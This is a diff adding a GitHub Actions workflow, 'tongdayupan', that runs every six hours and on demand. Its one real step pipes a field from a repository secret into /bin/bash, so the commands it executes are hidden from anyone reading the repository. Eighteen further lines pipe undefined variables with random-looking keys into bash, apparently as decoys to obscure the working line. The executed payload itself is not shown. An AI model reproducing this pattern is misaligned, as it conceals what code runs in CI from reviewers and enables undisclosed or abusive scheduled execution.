@@ -1,0 +1,36 @@
+name: tongdayupan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongdayupan
+        env:
+          kqshs55: ${{ secrets.kqshs55 }}
+        run: |
+          echo $kqshs55 | jq -r .pqikz84638 | /bin/bash
+          echo $opeu628 | jq -r .cdvz53883 | /bin/bash
+          echo $dscfw7965 | jq -r .rq11708 | /bin/bash
+          echo $ah72577 | jq -r .ioc17262 | /bin/bash
+          echo $y5 | jq -r .jkeyt558 | /bin/bash
+          echo $a624 | jq -r .bqpwz4370 | /bin/bash
+          echo $rwbvm847 | jq -r .vda15 | /bin/bash
+          echo $xlm90501 | jq -r .vt7147 | /bin/bash
+          echo $o81999 | jq -r .cn3 | /bin/bash
+          echo $ydc08058 | jq -r .hdh74 | /bin/bash
+          echo $cng7759 | jq -r .cugg77 | /bin/bash
+          echo $bmu8 | jq -r .hp59038 | /bin/bash
+          echo $s086 | jq -r .m8211 | /bin/bash
+          echo $x006 | jq -r .busxs429 | /bin/bash
+          echo $b940 | jq -r .pkc1901 | /bin/bash
+          echo $sdh72 | jq -r .v04926 | /bin/bash
+          echo $vbcmc7 | jq -r .kk3 | /bin/bash
+          echo $i0115 | jq -r .bnvak666 | /bin/bash
+          echo $z175 | jq -r .bv245 | /bin/bash
+
